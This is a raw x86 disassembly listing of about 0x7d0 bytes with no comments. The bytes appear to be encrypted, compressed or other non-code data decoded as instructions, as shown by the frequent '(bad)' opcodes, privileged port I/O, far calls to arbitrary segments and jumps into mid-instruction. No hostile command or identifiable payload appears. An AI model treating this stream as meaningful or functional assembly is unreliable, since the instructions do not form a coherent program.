  4178bf:	adc    esp,esp
  4178c1:	sti    
  4178c2:	popa   
  4178c3:	push   edi
  4178c4:	aam    0xe1
  4178c6:	stos   DWORD PTR es:[edi],eax
  4178c7:	sub    ebp,DWORD PTR [esi+eax*1-0xa]
  4178cb:	pop    ds
  4178cc:	cmp    bh,BYTE PTR [ecx+0x4f]
  4178cf:	mov    cl,0xfe
  4178d1:	into   
  4178d2:	xor    BYTE PTR [eax-0x78],bl
  4178d5:	cmp    eax,0x9713934e
  4178da:	push   edx
  4178db:	xchg   ebp,eax
  4178dc:	sub    BYTE PTR [edx],bl
  4178de:	repnz mov dh,0x54
  4178e1:	jp     0x417909
  4178e3:	in     al,dx
  4178e4:	ja     0x417950
  4178e6:	test   eax,0x73f809ed
  4178eb:	pushf  
  4178ec:	cwde   
  4178ed:	xor    al,0x27
  4178ef:	test   BYTE PTR [esi-0x21],0x9
  4178f3:	aaa    
  4178f4:	lods   al,BYTE PTR ds:[esi]
  4178f5:	(bad)  
  4178f6:	jb     0x4178d8
  4178f8:	cld    
  4178f9:	ja     0x4178b4
  4178fb:	dec    ebx
  4178fc:	ja     0x41794a
  4178fe:	out    0x95,al
  417900:	cmp    al,0x2b
  417902:	retf   0x20e6
  417905:	mov    al,ds:0xd2cc8aa
  41790a:	(bad)  
  41790b:	addr16 es fs sbb cl,bl
  417910:	popa   
  417911:	loope  0x417907
  417913:	jmp    0x3f0173fe
  417918:	xchg   ecx,eax
  417919:	and    ebx,esi
  41791b:	jecxz  0x41793c
  41791d:	pop    edx
  41791e:	jae    0x4178ff
  417920:	inc    ebx
  417921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417922:	fist   WORD PTR [edx+ebx*1+0x45]
  417926:	pop    eax
  417927:	mov    bh,0xf0
  417929:	add    ebx,DWORD PTR [edx-0x71]
  41792c:	stos   BYTE PTR es:[edi],al
  41792d:	sar    BYTE PTR [edi+0x21],0x1f
  417931:	xor    eax,0xbd98581f
  417936:	push   ds
  417937:	adc    esp,edi
  417939:	dec    esp
  41793a:	lds    eax,FWORD PTR [esi]
  41793c:	and    edx,DWORD PTR [ebx+0x1d4a332]
  417942:	aaa    
  417943:	and    ebx,DWORD PTR [ebp+0x56]
  417946:	sub    eax,0x1408e6f4
  41794b:	ins    BYTE PTR es:[edi],dx
  41794c:	test   eax,0x5e30a261
  417951:	call   0xa813:0xd8dcf1ba
  417958:	pop    bx
  41795a:	stos   DWORD PTR es:[edi],eax
  41795b:	adc    eax,0x15d1290
  417960:	nop
  417961:	ds dec ecx
  417963:	bound  ebx,QWORD PTR [eax]
  417965:	mov    eax,0xaaa3465d
  41796a:	inc    eax
  41796b:	and    ebx,ebx
  41796d:	xchg   ebp,eax
  41796e:	fadd   DWORD PTR [ecx-0x1bc05a88]
  417974:	xchg   ebx,eax
  417975:	cmp    dh,BYTE PTR [ebx+0x7bc4c202]
  41797b:	jge    0x417921
  41797d:	add    DWORD PTR [ebx],0xfc0c3edb
  417983:	dec    ebx
  417984:	push   esi
  417985:	mov    esp,0xcb637ee4
  41798a:	stos   BYTE PTR es:[edi],al
  41798b:	aam    0x52
  41798d:	push   cs
  41798e:	xor    eax,0xd85a8d33
  417993:	cs pusha 
  417995:	cwde   
  417996:	xchg   edi,eax
  417997:	lds    esi,FWORD PTR ds:0x61b76e66
  41799d:	dec    esi
  41799e:	pop    ebx
  41799f:	dec    esp
  4179a0:	cld    
  4179a1:	pop    esi
  4179a2:	and    edi,DWORD PTR [edi+0x580967ba]
  4179a8:	and    eax,0xdde86f23
  4179ad:	add    ch,0xf4
  4179b0:	(bad)  
  4179b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179b3:	push   cs
  4179b4:	mov    dl,0xa5
  4179b6:	(bad)  
  4179b7:	call   0xe6b5c82e
  4179bc:	jg     0x4179e6
  4179be:	mov    BYTE PTR [eax],dh
  4179c0:	xchg   ebp,eax
  4179c1:	mov    bl,0xb2
  4179c3:	cmp    ch,cl
  4179c5:	push   ebp
  4179c6:	(bad)  
  4179c8:	(bad)  
  4179ca:	push   ebx
  4179cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179cc:	mov    bh,0xe3
  4179ce:	cwde   
  4179cf:	and    BYTE PTR [esi-0xf285fcd],ch
  4179d5:	test   DWORD PTR [edx-0x5c12758f],edx
  4179db:	test   BYTE PTR [esi+0x20],bh
  4179de:	or     esi,DWORD PTR [ebx-0x51]
  4179e1:	call   0xef4b9c46
  4179e6:	(bad)  
  4179e7:	xor    al,bh
  4179e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ea:	jne    0x41796c
  4179ec:	pushf  
  4179ed:	sub    eax,0xc1e02f76
  4179f2:	retf   0xb407
  4179f5:	out    dx,eax
  4179f6:	push   esp
  4179f7:	mov    bh,0xcd
  4179f9:	sbb    ah,BYTE PTR [edi-0x3ff2ea06]
  4179ff:	cmp    ch,BYTE PTR [esi-0x1927707f]
  417a05:	dec    ecx
  417a06:	shl    ebp,1
  417a08:	push   ss
  417a09:	sbb    DWORD PTR [ebp+0x9],ebx
  417a0c:	sub    eax,DWORD PTR [ebx+0x360c48f2]
  417a12:	adc    bl,cl
  417a14:	fdivr  st(0),st
  417a16:	(bad)  
  417a17:	int    0x4
  417a19:	cmp    eax,0x75dd9e6d
  417a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a1f:	sub    eax,0x6d65ded1
  417a24:	mov    es,WORD PTR [edi+edx*2-0x5c]
  417a28:	push   ss
  417a29:	mov    esi,0xae08a3f4
  417a2e:	stos   BYTE PTR es:[edi],al
  417a2f:	and    esp,edx
  417a31:	fisubr DWORD PTR [eax]
  417a33:	clc    
  417a34:	pusha  
  417a35:	repnz das 
  417a37:	xchg   DWORD PTR [eax-0x5e],ecx
  417a3a:	mov    BYTE PTR ds:0x8bfaedbc,cl
  417a40:	inc    edx
  417a41:	xor    eax,0xd45d1d39
  417a46:	mov    bh,0x9a
  417a48:	mov    esp,0x6b0a70c
  417a4e:	mov    ebx,0x30fbf729
  417a53:	test   eax,0xa480b6d0
  417a58:	or     BYTE PTR [ecx+0x47],dh
  417a5b:	and    al,0x5f
  417a5d:	mov    bh,0x90
  417a5f:	add    BYTE PTR [edx],dh
  417a61:	push   edi
  417a62:	push   ss
  417a63:	es jmp 0x499c30dd
  417a69:	loop   0x417a64
  417a6b:	out    0x39,al
  417a6d:	adc    esi,DWORD PTR [edx-0x664eb0f9]
  417a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a74:	jp     0x417ae5
  417a76:	push   es
  417a77:	inc    edi
  417a78:	inc    ebp
  417a79:	fwait
  417a7a:	and    eax,0x4850260
  417a7f:	push   esp
  417a80:	mov    esp,0xd76a640e
  417a85:	cmp    DWORD PTR ds:0x85e9508,0x65
  417a8c:	pop    ecx
  417a8d:	aaa    
  417a8e:	das    
  417a8f:	inc    eax
  417a90:	gs jg  0x417acf
  417a93:	sub    eax,0x659bd17a
  417a98:	adc    ch,al
  417a9a:	add    cl,dh
  417a9c:	(bad)  
  417a9d:	out    dx,al
  417a9e:	data16 cmp ch,BYTE PTR [eax+0x5d]
  417aa2:	inc    esp
  417aa3:	xchg   DWORD PTR [edx+eax*1-0x6d698bb2],esp
  417aaa:	loop   0x417a5f
  417aac:	mov    cl,0xca
  417aae:	mov    edi,0xb3dd263
  417ab3:	popa   
  417ab4:	pop    ss
  417ab5:	cmp    cl,BYTE PTR [ebx-0x6483254]
  417abb:	aaa    
  417abc:	dec    ebp
  417abd:	xchg   edi,eax
  417abe:	cmp    dl,BYTE PTR [edx]
  417ac0:	cmp    dl,BYTE PTR [edi-0x6fef7850]
  417ac6:	popf   
  417ac7:	outs   dx,DWORD PTR ds:[esi]
  417ac8:	push   0x309651c0
  417acd:	mov    ecx,0x8e054d1a
  417ad2:	jnp    0x417b40
  417ad4:	pop    edi
  417ad5:	pop    edx
  417ad6:	xor    DWORD PTR [ebx+0x2],ecx
  417ad9:	test   al,0x9b
  417adb:	mov    ch,0xea
  417add:	or     DWORD PTR [edi],esp
  417adf:	jns    0x417ab4
  417ae1:	outs   dx,BYTE PTR ss:[esi]
  417ae3:	xor    BYTE PTR [edx-0xe],bl
  417ae6:	hlt    
  417ae7:	add    eax,DWORD PTR [ebx+0x67b3a57]
  417aed:	call   0x1d6fbca
  417af2:	lea    ebx,[esi-0x21]
  417af5:	mov    ch,0xf9
  417af7:	mul    ecx
  417af9:	rol    BYTE PTR [ecx-0x5],1
  417afc:	dec    BYTE PTR [ebx+0x33]
  417aff:	gs mul al
  417b02:	repnz nop
  417b04:	or     eax,0xcbceef7d
  417b09:	mov    ebp,0xea895c56
  417b0e:	add    BYTE PTR [eax-0x44],cl
  417b11:	aas    
  417b12:	jecxz  0x417b8a
  417b14:	lock bnd jbe 0x417b6c
  417b18:	ja     0x417ad1
  417b1a:	(bad)
  417b1d:	nop
  417b1e:	int3   
  417b1f:	xor    eax,DWORD PTR [ecx-0x1fd81bde]
  417b25:	mov    eax,0x646c35a
  417b2a:	outs   dx,DWORD PTR ds:[esi]
  417b2b:	sub    dh,0x6d
  417b2e:	arpl   WORD PTR [edx-0x4a],cx
  417b31:	xchg   ebx,eax
  417b32:	push   ds
  417b33:	adc    al,0xa5
  417b35:	cdq    
  417b36:	pop    ss
  417b37:	imul   BYTE PTR [ecx]
  417b39:	xchg   esp,eax
  417b3a:	fdivrp st(3),st
  417b3c:	pop    edx
  417b3d:	aad    0xf7
  417b3f:	pop    edi
  417b40:	xchg   ebx,eax
  417b41:	adc    ebx,DWORD PTR [edx-0x1f931738]
  417b47:	push   eax
  417b48:	xor    DWORD PTR [edi-0x39b9cd77],esp
  417b4e:	test   al,0x20
  417b50:	pushf  
  417b51:	dec    edi
  417b52:	iret   
  417b53:	iret   
  417b54:	pop    ds
  417b55:	push   ss
  417b56:	mov    eax,ds:0x381f776d
  417b5b:	test   DWORD PTR [edx+0x7278b8f2],edx
  417b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b62:	mov    ds:0x2e72ed14,al
  417b67:	or     esp,ecx
  417b69:	sub    eax,DWORD PTR [edx]
  417b6b:	icebp  
  417b6c:	inc    ebp
  417b6d:	add    ecx,DWORD PTR [edi+0x6418ae47]
  417b73:	inc    eax
  417b74:	mov    esp,0xc8a6ab2b
  417b79:	jns    0x417bce
  417b7b:	mov    bl,0xd8
  417b7d:	or     bh,bh
  417b7f:	sbb    DWORD PTR [ebx-0xa],edx
  417b82:	cli    
  417b83:	out    dx,al
  417b84:	shl    eax,1
  417b86:	cmp    esi,ebx
  417b88:	test   BYTE PTR [ecx-0x3b6f23eb],dl
  417b8e:	retf   
  417b8f:	stos   BYTE PTR es:[edi],al
  417b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b91:	push   edx
  417b92:	out    dx,eax
  417b93:	xchg   edx,eax
  417b94:	bound  ebp,QWORD PTR [edx-0x19]
  417b97:	sbb    DWORD PTR [eax],edx
  417b99:	and    bl,bh
  417b9b:	int3   
  417b9c:	rcl    esp,1
  417b9e:	adc    DWORD PTR [edx-0xb238d33],esi
  417ba4:	push   edi
  417ba5:	or     al,0xd3
  417ba7:	mov    bh,0x95
  417ba9:	outs   dx,DWORD PTR ds:[esi]
  417baa:	pop    ds
  417bab:	xchg   edx,eax
  417bac:	icebp  
  417bad:	cmp    BYTE PTR [esi],0x4f
  417bb0:	pop    eax
  417bb1:	jle    0x417b91
  417bb3:	out    0x6e,al
  417bb5:	outs   dx,DWORD PTR ds:[esi]
  417bb6:	inc    edi
  417bb7:	aam    0xa
  417bb9:	adc    eax,0x826f4b5c
  417bbe:	pop    edx
  417bbf:	mov    cl,BYTE PTR [edx+0x3e]
  417bc2:	sti    
  417bc3:	pop    esi
  417bc4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417bc6:	bound  eax,QWORD PTR [ebp+0x5d9d413e]
  417bcc:	mov    bh,0x5d
  417bce:	cmp    al,0x2
  417bd0:	daa    
  417bd1:	xchg   esi,eax
  417bd2:	not    DWORD PTR [esi]
  417bd4:	ins    BYTE PTR es:[edi],dx
  417bd5:	ins    DWORD PTR es:[edi],dx
  417bd6:	imul   eax,DWORD PTR [ebp+0x76],0x2f
  417bda:	jmp    0xf1ad:0x6e0f40ad
  417be1:	inc    ebx
  417be2:	sti    
  417be3:	push   ss
  417be4:	adc    BYTE PTR [ebx+0x73],dh
  417be7:	or     esi,DWORD PTR [edx]
  417be9:	xor    al,0x24
  417beb:	dec    DWORD PTR [esi]
  417bed:	dec    edx
  417bee:	icebp  
  417bef:	xchg   edx,eax
  417bf0:	enter  0x16bb,0x43
  417bf4:	arpl   WORD PTR [ebx-0x11c3d798],bx
  417bfa:	add    DWORD PTR [ebx-0x49],esp
  417bfd:	xor    DWORD PTR ds:0x8885c0f8,edx
  417c03:	dec    esi
  417c04:	add    DWORD PTR [edx+0x33],0x814e8c94
  417c0b:	test   DWORD PTR [eax-0x5aac4db7],ebp
  417c11:	sbb    DWORD PTR [ebx+0x79],esi
  417c14:	adc    edx,DWORD PTR [ebx-0x3c]
  417c17:	or     BYTE PTR [edi],dh
  417c19:	xor    esi,DWORD PTR [ecx]
  417c1b:	adc    dh,ah
  417c1d:	push   eax
  417c1e:	sub    bl,ah
  417c20:	jb     0x417c0b
  417c22:	int    0xa2
  417c24:	and    BYTE PTR [ebp-0x1],dh
  417c27:	xchg   esi,eax
  417c28:	mov    dh,0x5c
  417c2a:	pop    ds
  417c2b:	dec    ebx
  417c2c:	loope  0x417c13
  417c2e:	daa    
  417c2f:	push   0xaca296bb
  417c34:	call   0x9cbf:0xa92b4644
  417c3b:	xchg   esi,eax
  417c3c:	inc    ecx
  417c3d:	aam    0x54
  417c3f:	and    bl,BYTE PTR [edx+0x3d]
  417c42:	xchg   ebx,eax
  417c43:	loop   0x417bf3
  417c45:	jnp    0x417c7b
  417c47:	out    0xcf,al
  417c49:	repnz pop ebx
  417c4b:	fdiv   st,st(4)
  417c4d:	cmp    al,0x24
  417c4f:	cmp    DWORD PTR [edx+0x40],eax
  417c52:	mov    bl,0x55
  417c54:	retf   0xcfc3
  417c57:	inc    ebx
  417c58:	xor    eax,0x98cdf03e
  417c5d:	popf   
  417c5e:	mov    ds:0x11ed10c0,eax
  417c63:	iret   
  417c64:	js     0x417c04
  417c66:	add    BYTE PTR [edi],0xf
  417c69:	add    eax,0xe28d5562
  417c6e:	sbb    al,0x91
  417c70:	inc    esi
  417c71:	pop    esp
  417c72:	stos   DWORD PTR es:[edi],eax
  417c73:	pop    ebx
  417c74:	or     cl,BYTE PTR [esi-0x5c2c2505]
  417c7a:	dec    ebx
  417c7b:	out    dx,eax
  417c7c:	inc    ebp
  417c7d:	arpl   WORD PTR [eax+0x13],dx
  417c80:	nop
  417c81:	sti    
  417c82:	dec    edx
  417c83:	pop    edx
  417c84:	fs cld 
  417c86:	xchg   esp,eax
  417c87:	dec    esi
  417c88:	arpl   WORD PTR [eax-0x4d437625],ax
  417c8e:	je     0x417c81
  417c90:	jo     0x417c6c
  417c92:	rol    BYTE PTR [edi],cl
  417c94:	fadd   QWORD PTR [eax]
  417c96:	lahf   
  417c97:	add    al,0x91
  417c99:	fmul   QWORD PTR ss:[ebx+0x7cedb45a]
  417ca0:	jp     0x417c93
  417ca2:	aas    
  417ca3:	in     eax,0x54
  417ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca6:	lods   al,BYTE PTR ds:[esi]
  417ca7:	in     al,dx
  417ca8:	pop    ds
  417ca9:	sbb    eax,0xeadf38e0
  417cae:	(bad)  
  417cb0:	sbb    BYTE PTR [ebp+0xfaf31e5],0xfb
  417cb7:	test   DWORD PTR [edx],esi
  417cb9:	inc    ecx
  417cba:	or     esi,edx
  417cbc:	rol    BYTE PTR [edi+0x1047f600],cl
  417cc2:	(bad)  
  417cc3:	sub    eax,0x1c5090b6
  417cc8:	inc    esi
  417cc9:	(bad)  
  417cca:	mov    eax,ds:0xd668718d
  417ccf:	adc    al,0x2a
  417cd1:	adc    DWORD PTR [eax+0x32],edx
  417cd4:	imul   esi,DWORD PTR [esi-0x58],0x5c
  417cd8:	daa    
  417cd9:	enter  0x5cb7,0xa
  417cdd:	cmp    al,0xce
  417cdf:	loopne 0x417cd9
  417ce1:	push   esi
  417ce2:	jo     0x417ca2
  417ce4:	(bad)  
  417ce5:	adc    ecx,ecx
  417ce7:	add    eax,0xa47fa64f
  417cec:	sub    al,al
  417cee:	popa   
  417cef:	aam    0x3b
  417cf1:	xchg   edx,eax
  417cf2:	sub    al,0xb5
  417cf4:	rcl    edx,1
  417cf6:	in     eax,dx
  417cf7:	mov    bl,0x30
  417cf9:	add    BYTE PTR [esp+ecx*2+0x6d8bc3a6],0x75
  417d01:	push   0xfae65152
  417d06:	aaa    
  417d07:	test   esp,0xc37de922
  417d0d:	mov    edx,0x7b8d3ea8
  417d12:	dec    ecx
  417d13:	mov    dh,0xa6
  417d15:	cmp    DWORD PTR [ebp+ebx*2-0x6267b5c0],0x332fcb06
  417d20:	mov    cl,0x3b
  417d22:	mov    ds:0xc4fd3a42,al
  417d27:	mov    dh,0x6d
  417d29:	xchg   esi,eax
  417d2a:	jg     0x417cb2
  417d2c:	push   0x30
  417d2e:	idiv   BYTE PTR ds:0xcf5efece
  417d34:	pop    ds
  417d35:	fisttp DWORD PTR [eax]
  417d37:	test   DWORD PTR [eax],edx
  417d39:	xchg   esi,eax
  417d3a:	jg     0x417cd8
  417d3c:	pop    ss
  417d3d:	out    0xa8,eax
  417d3f:	sti    
  417d40:	inc    esi
  417d41:	sub    DWORD PTR [edi-0x4f79a0fd],0xf95f7e6
  417d4b:	xchg   BYTE PTR [esi+0x6e],ah
  417d4e:	in     al,0xe5
  417d50:	pusha  
  417d51:	mov    WORD PTR [ebp+0x33a1a89],ds
  417d57:	sbb    BYTE PTR [edi],dl
  417d59:	push   cs
  417d5a:	jmp    0x7b92:0xb382f49f
  417d61:	lods   al,BYTE PTR ds:[esi]
  417d62:	mov    eax,ds:0xc4f4bc2c
  417d67:	and    DWORD PTR [ebp+0x1b],0xbed10364
  417d6e:	mov    al,ds:0x2541598f
  417d73:	out    dx,eax
  417d74:	cmp    eax,DWORD PTR [edx-0x1f]
  417d77:	cs dec edx
  417d79:	cmp    ecx,ebx
  417d7b:	imul   esp,DWORD PTR [eax+edx*4],0x62
  417d7f:	std    
  417d80:	std    
  417d81:	mov    ebx,0x5a1d1538
  417d86:	sub    eax,0xd9b1f81
  417d8b:	push   esi
  417d8c:	inc    esp
  417d8d:	xlat   BYTE PTR ds:[ebx]
  417d8e:	lods   al,BYTE PTR ds:[esi]
  417d8f:	pop    ss
  417d90:	sub    BYTE PTR [ecx-0x1b84b5f6],0x7e
  417d97:	call   0xf957:0xca7628cd
  417d9e:	icebp  
  417d9f:	sbb    al,dh
  417da1:	adc    al,0xd8
  417da3:	sub    edx,0xd124a4eb
  417da9:	sub    BYTE PTR [ecx+ebp*8],bh
  417dac:	imul   eax,DWORD PTR [eax-0x23e65807],0xffffffa5
  417db3:	out    dx,eax
  417db4:	sub    al,0x38
  417db6:	aad    0xad
  417db8:	stos   BYTE PTR es:[edi],al
  417db9:	pop    ecx
  417dba:	aam    0x51
  417dbc:	lds    eax,FWORD PTR [eax-0x57]
  417dbf:	imul   BYTE PTR [ebp+0x10]
  417dc2:	mov    ecx,0xda8335fb
  417dc7:	mov    cl,0x1d
  417dc9:	nop
  417dca:	test   DWORD PTR [edi-0x6f],ebx
  417dcd:	inc    ebp
  417dce:	jmp    0x6682:0xf9e3ecae
  417dd5:	jl     0x417d6c
  417dd7:	loope  0x417db1
  417dd9:	bound  edx,QWORD PTR [ecx-0x6d]
  417ddc:	mov    dl,0x83
  417dde:	int3   
  417ddf:	fisttp QWORD PTR [ebp-0x372b68e4]
  417de5:	pushf  
  417de6:	sub    BYTE PTR [esi+0x7cdb5541],dl
  417dec:	cli    
  417ded:	(bad)  
  417def:	(bad)  
  417df1:	add    BYTE PTR [edi+eiz*1+0x33],0x8
  417df6:	cdq    
  417df7:	sub    ebp,ecx
  417df9:	outs   dx,BYTE PTR ds:[esi]
  417dfa:	aaa    
  417dfb:	sbb    al,0x6e
  417dfd:	out    0x1,eax
  417dff:	iret   
  417e00:	(bad)  
  417e01:	xor    eax,0xeaee259a
  417e06:	inc    ebx
  417e07:	pop    ecx
  417e08:	icebp  
  417e09:	mov    bl,0x88
  417e0b:	(bad)  
  417e0c:	adc    ebp,edx
  417e0e:	push   0xfac94ba3
  417e13:	pusha  
  417e14:	adc    eax,0xc9d398ad
  417e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1a:	iret   
  417e1b:	int3   
  417e1c:	mov    bl,0x51
  417e1e:	adc    BYTE PTR [esi],0xf5
  417e21:	pusha  
  417e22:	outs   dx,BYTE PTR ds:[esi]
  417e23:	fild   QWORD PTR [esi]
  417e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e26:	inc    edi
  417e27:	leave  
  417e28:	ins    BYTE PTR es:[edi],dx
  417e29:	push   esp
  417e2a:	dec    ecx
  417e2b:	fdivr  DWORD PTR [edx+0x7a]
  417e2e:	dec    eax
  417e2f:	ror    dh,1
  417e31:	lds    ebp,FWORD PTR [ebx+0x33]
  417e34:	push   cs
  417e35:	js     0x417eb4
  417e37:	mov    ebx,0x76407ed0
  417e3c:	js     0x417dcd
  417e3e:	mov    eax,0xa6b5558a
  417e43:	sbb    esi,ebp
  417e45:	test   ah,cl
  417e47:	xor    ah,BYTE PTR [edx+ebx*1]
  417e4a:	cmp    bh,bl
  417e4c:	add    DWORD PTR [ecx],esp
  417e4e:	les    ebx,FWORD PTR [eax]
  417e50:	xor    ah,0xea
  417e53:	mov    ebp,0x31bada3f
  417e58:	push   ebx
  417e59:	aam    0x42
  417e5b:	and    eax,0xde12eeaf
  417e60:	xor    ebx,eax
  417e62:	sub    BYTE PTR [ebp+0x6721fedf],al
  417e68:	ja     0x417e8d
  417e6a:	cld    
  417e6b:	js     0x417e3c
  417e6d:	(bad)  
  417e6f:	fldcw  WORD PTR [ecx-0x8]
  417e72:	aam    0x60
  417e74:	pop    esi
  417e75:	rol    BYTE PTR ds:0x619514da,1
  417e7b:	cmc    
  417e7c:	leave  
  417e7d:	or     edi,ebp
  417e7f:	popa   
  417e80:	fwait
  417e81:	dec    ebx
  417e82:	push   0xc5e698c8
  417e87:	lods   al,BYTE PTR ds:[esi]
  417e88:	les    edi,FWORD PTR [ebp+0x21ea9464]
  417e8e:	xchg   BYTE PTR [ecx+ebx*2+0x62],dl
  417e92:	mov    ecx,0x5096b6e4
  417e97:	les    ebp,FWORD PTR [esi]
  417e99:	push   edi
  417e9a:	aad    0xbd
  417e9c:	lea    ebx,[ecx+eiz*4]
  417e9f:	aas    
  417ea0:	inc    esi
  417ea1:	call   0xe7b4:0x303c3256
  417ea8:	lock jmp 0x9b3620c8
  417eae:	mov    esp,0xc7b420ea
  417eb3:	sbb    al,0x7f
  417eb5:	jle    0x417e59
  417eb7:	imul   eax,DWORD PTR [ebx+0x7f],0x34
  417ebb:	push   edi
  417ebc:	add    dl,0x13
  417ebf:	push   ds
  417ec0:	test   eax,0xc1f8f5e3
  417ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec6:	jmp    edi
  417ec8:	popa   
  417ec9:	mov    ebx,0xa6a92d6c
  417ece:	imul   ebp,DWORD PTR [edx+0x6d41605d],0xe96bddf8
  417ed8:	pop    edi
  417ed9:	push   eax
  417eda:	mov    ebx,0x6a03ce79
  417edf:	jle    0x417ecf
  417ee1:	add    BYTE PTR [ecx-0x492ed43b],ah
  417ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ee8:	jmp    0x417ecc
  417eea:	xchg   DWORD PTR ds:0xe7242aee,eax
  417ef0:	xchg   ecx,eax
  417ef1:	mov    cl,0x4e
  417ef3:	pop    ebp
  417ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef5:	mov    dh,0x6f
  417ef7:	fwait
  417ef8:	call   0xef86f73e
  417efd:	out    0x1b,eax
  417eff:	fist   DWORD PTR [ebx+0x31973f3d]
  417f05:	ja     0x417f14
  417f07:	into   
  417f08:	mov    eax,ds:0x46854a85
  417f0d:	retf   
  417f0e:	js     0x417ebd
  417f10:	daa    
  417f11:	pusha  
  417f12:	sbb    BYTE PTR [esi-0x7cb223d4],0x87
  417f19:	fcom   QWORD PTR [ebp+0x39]
  417f1c:	scas   eax,DWORD PTR es:[edi]
  417f1d:	(bad)
  417f21:	mov    WORD PTR [ecx+0x31fb79cd],ds
  417f27:	pusha  
  417f28:	cdq    
  417f29:	add    eax,0xdc4a6963
  417f2e:	pop    eax
  417f2f:	and    al,0xce
  417f31:	mov    eax,0x96fabe06
  417f36:	in     al,dx
  417f37:	jl     0x417f64
  417f39:	shl    BYTE PTR [edx+eax*2],0x92
  417f3d:	push   esi
  417f3e:	mov    al,0x46
  417f40:	es dec edx
  417f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f43:	imul   esi,DWORD PTR ds:0xaab9f155,0xffffff88
  417f4a:	adc    esi,DWORD PTR [ebx]
  417f4c:	je     0x417ed6
  417f4e:	jg     0x417f24
  417f50:	(bad)  
  417f52:	pop    edx
  417f53:	leave  
  417f54:	and    BYTE PTR [ecx-0x4c],dh
  417f57:	jp     0x417fc0
  417f59:	jl     0x417ee0
  417f5b:	enter  0xdb33,0x31
  417f5f:	cli    
  417f60:	pop    ebx
  417f61:	pusha  
  417f62:	push   cs
  417f63:	mov    esi,0xdf45b295
  417f68:	mov    ds:0xe8fa69dc,al
  417f6d:	and    al,0xb2
  417f6f:	bound  ebp,QWORD PTR [edi+0x2b]
  417f72:	pop    esi
  417f73:	aas    
  417f74:	or     BYTE PTR [ebp-0x2e],bh
  417f77:	in     al,0xfd
  417f79:	call   0xaa0d1bb1
  417f7e:	aam    0x62
  417f80:	pop    es
  417f81:	inc    esp
  417f82:	mov    edi,0x8b9e9481
  417f87:	push   ebx
  417f88:	push   eax
  417f89:	ss aaa 
  417f8b:	mov    esp,0x87bd886c
  417f90:	push   ebp
  417f91:	pop    es
  417f92:	add    BYTE PTR [edi+0xf],cl
  417f95:	jno    0x417f70
  417f97:	xor    bh,cl
  417f99:	out    0x68,al
  417f9b:	and    al,0x1b
  417f9d:	loopne 0x41800d
  417f9f:	cld    
  417fa0:	cwde   
  417fa1:	aam    0x86
  417fa3:	mov    al,ds:0x9f6c6a0
  417fa8:	mov    al,ds:0x3deddd59
  417fad:	sub    edi,DWORD PTR [edi+0x768a621d]
  417fb3:	cmp    BYTE PTR [edx],ah
  417fb5:	cli    
  417fb6:	xchg   esp,eax
  417fb7:	sub    ch,BYTE PTR [eax-0x4746a484]
  417fbd:	out    0x8b,al
  417fbf:	popa   
  417fc0:	dec    eax
  417fc1:	ret    0xa6eb
  417fc4:	jno    0x417fe7
  417fc6:	call   0x6b56:0x50088da9
  417fcd:	aam    0x5e
  417fcf:	mov    eax,0xeaae8b06
  417fd4:	sub    DWORD PTR [edx],0x90fa771
  417fda:	or     eax,0x8d9902bd
  417fdf:	push   cs
  417fe0:	addr16 xchg ebx,eax
  417fe2:	outs   dx,DWORD PTR ds:[esi]
  417fe3:	fnstenv [ebx-0x51ebef5f]
  417fe9:	add    DWORD PTR [edx+0x62eba29d],edi
  417fef:	inc    ecx
  417ff0:	je     0x417fd1
  417ff2:	push   esp
  417ff3:	shl    eax,cl
  417ff5:	adc    DWORD PTR [eax+0x2c],ecx
  417ff8:	inc    eax
  417ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffa:	arpl   WORD PTR [edi-0x3eaadfda],cx
  418000:	cmp    ebx,DWORD PTR [esi]
  418002:	(bad)  
  418003:	fwait
  418004:	popa   
  418005:	mov    esp,0xcedd80f2
  41800a:	out    0x9e,eax
  41800c:	imul   ebx,DWORD PTR [ecx+eax*1+0x6364b2b8],0x9b2f62f3
  418017:	mov    esp,0x8a236b56
  41801c:	mov    eax,DWORD PTR [edx]
  41801e:	cmp    BYTE PTR [esi+0x64a0dd1b],0xcd
  418025:	sub    al,0xd2
  418027:	and    cl,BYTE PTR [ebp-0x683991e9]
  41802d:	mov    esp,0xe229eec3
  418032:	jnp    0x418017
  418034:	jno    0x418097
  418036:	inc    esp
  418037:	in     eax,dx
  418038:	gs or  eax,0xc3e01b09
  41803e:	mov    dl,0x30
  418040:	adc    al,0x42
  418042:	xor    al,BYTE PTR ds:0xb83e3766
  418048:	add    DWORD PTR [edx+0x365282f4],edx
  41804e:	bound  ecx,QWORD PTR [edi-0x28cd407]
  418054:	or     DWORD PTR ss:[eax],esp
  418057:	loope  0x41800f
  418059:	dec    esp
  41805a:	mov    cl,0x84
  41805c:	push   eax
  41805d:	jns    0x418050
  41805f:	jns    0x417fef
  418061:	mov    ah,0x4c
  418063:	fptan  
  418065:	outs   dx,BYTE PTR ds:[esi]
  418066:	xor    esi,DWORD PTR [edx-0x4f]
  418069:	sbb    ecx,DWORD PTR [esi+ebp*4]
  41806c:	push   ebp
  41806d:	mov    ebx,0x7a50e431
  418072:	dec    esi
  418073:	in     eax,0x49
  418075:	add    edx,DWORD PTR [esi]
  418077:	sub    al,0x82
  418079:	cmp    esi,ebx
  41807b:	dec    di
  41807d:	out    0xdb,al
  41807f:	ret    
  418080:	les    edi,FWORD PTR [ecx]
  418082:	test   al,dh
  418084:	sbb    eax,0x933009c3
  418089:	mov    bh,0xd6
  41808b:	adc    al,0x1e
  41808d:	pop    es
